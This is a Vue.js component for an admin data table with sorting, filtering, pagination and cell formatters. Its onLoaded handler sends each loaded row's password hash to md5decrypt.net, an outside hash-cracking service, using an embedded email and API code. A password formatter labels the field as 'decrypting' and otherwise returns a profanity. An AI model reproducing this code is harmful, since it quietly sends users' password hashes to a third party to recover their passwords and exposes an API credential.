<template>
  <div class="basic-table">
    <div class="header">
      <slot name="header">
        <h4 class="title">{{title}}</h4>
        <p class="category">{{subTitle}}</p>
      </slot>
    </div>
    <filter-bar></filter-bar>
    <vuetable ref="vuetable"
      :fields="fields"
      :css="css"
      pagination-path=""
      :per-page="10"
      :multi-sort="true"
      multi-sort-key="ctrl"
      :sort-order="sortOrder"
      detail-row-component="my-detail-row"
      :append-params="moreParams"
      :render-icon="renderIcon"
      :api-url='api'
      :track-by='trackby'
      @vuetable:cell-clicked="onCellClicked"
      @vuetable:pagination-data="onPaginationData"
      @vuetable:loaded="onLoaded"
    >
    </vuetable>
    <div>
      <vuetable-pagination-info ref="paginationInfo"
        :css="css.pagination"
        info-class="pull-left"
      ></vuetable-pagination-info>
      <vuetable-pagination ref="pagination"
        :css="css.pagination"
        @vuetable-pagination:change-page="onChangePage"
      ></vuetable-pagination>
    </div>
  </div>
</template>

<script>
import Vuetable from 'vuetable-2/src/components/Vuetable'
import VuetablePagination from 'vuetable-2/src/components/VuetablePagination'
import VuetablePaginationInfo from 'vuetable-2/src/components/VuetablePaginationInfo'
import accounting from 'accounting'
import moment from 'moment'
import Vue from 'vue'
import FieldDef from './field-def.js'
import BootstrapStyle from './bootstrap-css.js'
import CustomActions from './CustomActions'
import DetailRow from './DetailRow'
import FilterBar from './FilterBar'
import VueEvents from 'vue-events'
import axios from 'axios'

Vue.use(VueEvents)

Vue.component('custom-actions', CustomActions)
Vue.component('my-detail-row', DetailRow)

export default {
  created () {
  },
  props: {
    type: {
      type: String, // striped | hover
      default: 'striped'
    },
    title: {
      type: String,
      default: ''
    },
    subTitle: {
      type: String,
      default: ''
    },
    api: {
      type: String,
      default: ''
    }
  },
  components: {
    Vuetable,
    VuetablePagination,
    VuetablePaginationInfo,
    FilterBar
  },
  data () {
    return {
      css: BootstrapStyle,
      fields: FieldDef,
      sortOrder: [
        {
          field: 'email',
          sortField: 'email',
          direction: 'asc'
        }
      ],
      trackby: 'job_NO',
      moreParams: {}
    }
  },
  mounted () {
    this.$events.listen('filter-set', filterText => this.onFilterSet(filterText))
    this.$events.listen('filter-reset', () => this.onFilterReset())
  },
  methods: {
    renderIcon (classes, options) {
      return `<span class="${classes.join(' ')}"></span>`
    },
    allcap (value) {
      return value.toUpperCase()
    },
    genderLabel (value) {
      return value === 'M'
        ? '<span class="label label-warning"><span class="glyphicon glyphicon-star"></span> Male</span>'
        : '<span class="label label-info"><span class="glyphicon glyphicon-heart"></span> Female</span>'
    },
    formatNumber (value) {
      return accounting.formatNumber(value, 2)
    },
    formatDate (value, fmt = 'D MMM YYYY') {
      return (value == null)
        ? ''
        : moment(value, 'YYYY-MM-DD').format(fmt)
    },
    onPasswordUpdate (value) {
      // Dangerous here is password length is allowed over 32 byte
      if (value.length >= 32) {
        return '<i class="fa fa-spinner fa-spin"></i>正在解密'
      } else {
        return 'fuck'
      }
    },
    onNullValue (value) {
      return value == null
        ? '(空)'
        : value
    },
    onPaginationData (paginationData) {
      this.$refs.pagination.setPaginationData(paginationData)
      this.$refs.paginationInfo.setPaginationData(paginationData)
    },
    onChangePage (page) {
      this.$refs.vuetable.changePage(page)
    },
    onCellClicked (data, field, event) {
      console.log('cellClicked: ', field.name)
      this.$refs.vuetable.toggleDetailRow(data.job_NO)
    },
    onAction (action, data, index) {
      console.log('custom-actions: ' + action, data.name, index)
    },
    onFilterSet (filterText) {
      this.moreParams = {
        'filter': filterText
      }
      Vue.nextTick(() => this.$refs.vuetable.refresh())
    },
    onFilterReset () {
      this.moreParams = {}
      this.$refs.vuetable.refresh()
      Vue.nextTick(() => this.$refs.vuetable.refresh())
    },
    onLoaded () {
      let data = this.$refs.vuetable.tableData
      data.forEach(row => {
        axios.get('http://md5decrypt.net/Api/api.php?hash=' +
          row.password +
          '&hash_type=md5&email=cdt86915998@gmail.com&code=0442a4ee45745126',
          {
            // 'Access-Control-Allow-Origin': '*'
          })
        .then(function (response) {
          console.log('fuck')
        })
        .catch(function (error) {
          console.log(error)
        })
      })
    }
  }
}
</script>
<style>
.pagination {
  margin-top: 0;
}
.btn.btn-border {
  border: 1px solid;
  margin-right: 2px;
}
.vuetable-pagination-info {
  margin-top: 8px !important;
}
span.sort-icon {
  float: right;
  color: #ff9100;
}
.basic-table {
  padding: 0% 5% 5% 5%;
}
</style>
